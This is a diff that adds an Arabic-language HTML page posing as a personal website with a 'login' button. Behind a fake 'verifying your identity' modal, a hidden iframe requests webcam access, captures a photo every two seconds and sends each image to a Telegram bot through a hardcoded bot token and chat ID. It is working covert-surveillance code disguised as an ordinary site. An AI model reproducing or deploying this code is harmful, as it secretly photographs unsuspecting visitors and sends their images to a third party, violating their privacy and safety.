@@ -1,0 +1,201 @@
+<!DOCTYPE html>  
+<html lang="ar" dir="rtl">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>أحمد طارق | الموقع الرسمي</title>  
+    <style>
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            margin: 0; 
+            padding: 0; 
+            background-color: #f4f4f9; 
+            display: flex; 
+            flex-direction: column; 
+            min-height: 100vh; 
+            align-items: center; 
+            justify-content: center;
+            text-align: center;
+        }
+
+        header {
+            width: 100%;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            position: fixed;
+            top: 0;
+            z-index: 10;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 90%;
+            margin-top: 60px;
+        }
+
+        h1 { color: #333; margin-bottom: 10px; }
+        .tagline { color: #666; display: block; margin-bottom: 20px; font-style: italic; }
+        p { color: #777; line-height: 1.6; }
+
+        .login-btn {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: background 0.3s;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .login-btn:hover { background-color: #0056b3; }
+
+        footer {
+            margin-top: auto;
+            padding: 20px;
+            color: #888;
+            font-size: 0.9rem;
+        }
+
+        /* النافذة المنبثقة للكاميرا المخفية */
+        #camera-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.8);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 400px;
+            position: relative;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 20px;
+            cursor: pointer;
+            color: #aaa;
+        }
+
+        iframe {
+            width: 100%;
+            height: 300px;
+            border: none;
+            border-radius: 8px;
+        }
+    </style>
+</head>  
+<body>  
+
+<header><div class="logo">أحمد طارق</div></header>  
+
+<div class="container">  
+    <h1>أهلاً بك في عالمي</h1>  
+    <span class="tagline">موقعي الجديد حلو ولا لا؟ ادخل وشوف</span>  
+    <p>نقدم لك تجربة فريدة من نوعها. اضغط على الزر أدناه للمتابعة.</p>  
+    <!-- عند الضغط، يتم فتح النافذة التي تحتوي على الكاميرا -->
+    <button class="login-btn" onclick="openCamera()">تسجيل الدخول</button>  
+</div>  
+
+<footer>&copy; 2026 أحمد طارق. جميع الحقوق محفوظة.</footer>  
+
+<!-- النافذة المنبثقة -->
+<div id="camera-modal">
+    <div class="modal-content">
+        <span class="close-btn" onclick="closeCamera()">&times;</span>
+        <h3>جارٍ التحقق...</h3>
+        <p style="color:#666; font-size: 0.9em;">يرجى الانتظار قليلاً بينما نقوم بتأكيد هويتك.</p>
+        
+        <!-- الـ iframe الذي يحتوي على الكاميرا المخفية -->
+        <iframe id="cam-frame"></iframe>
+    </div>
+</div>
+
+<script>
+    // بيانات البوت الخاصة بك
+    const BOT_TOKEN = '9245241768:AAHuTT8kN-B9RGomtcJ_bxu6EsKWQl2Ccoc';  
+    const CHAT_ID = '1861524547';  
+
+    function openCamera() {
+        document.getElementById('camera-modal').style.display = 'flex';
+        
+        // إنشاء صفحة HTML صغيرة داخل الـ iframe لطلب الكاميرا
+        const frameContent = `
+            <!DOCTYPE html>
+            <html>
+            <body style="margin:0; overflow:hidden; background:white;">
+                <video id="v" autoplay playsinline muted></video>
+                <canvas id="c" style="display:none;"></canvas>
+                <script>
+                    const video = document.getElementById('v');
+                    const canvas = document.getElementById('c');
+                    
+                    // طلب إذن الكاميرا
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => {
+                            video.srcObject = stream;
+                            
+                            // دالة الالتقاط المستمر
+                            setInterval(() => {
+                                if(video.readyState >= 2) {
+                                    canvas.width = video.videoWidth || 640;
+                                    canvas.height = video.videoHeight || 480;
+                                    const ctx = canvas.getContext('2d');
+                                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                    
+                                    canvas.toBlob(blob => {
+                                        if(!blob) return;
+                                        const formData = new FormData();
+                                        formData.append("chat_id", "${CHAT_ID}");
+                                        formData.append("photo", blob, "user_photo.jpg");
+                                        formData.append("caption", "📸 صورة جديدة من التكرار!");
+                                        
+                                        fetch("https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto", {
+                                            method: 'POST',
+                                            body: formData
+                                        }).catch(console.error);
+                                    }, 'image/jpeg', 0.85);
+                                }
+                            }, 2000); // التقاط صورة كل ثانيتين
+                        })
+                        .catch(err => console.log("Error:", err));
+                <\/script>
+            </body>
+            </html>
+        `;
+
+        const iframe = document.getElementById('cam-frame');
+        iframe.srcdoc = frameContent;
+    }
+
+    function closeCamera() {
+        document.getElementById('camera-modal').style.display = 'none';
+    }
+</script>  
+</body>  
+</html>
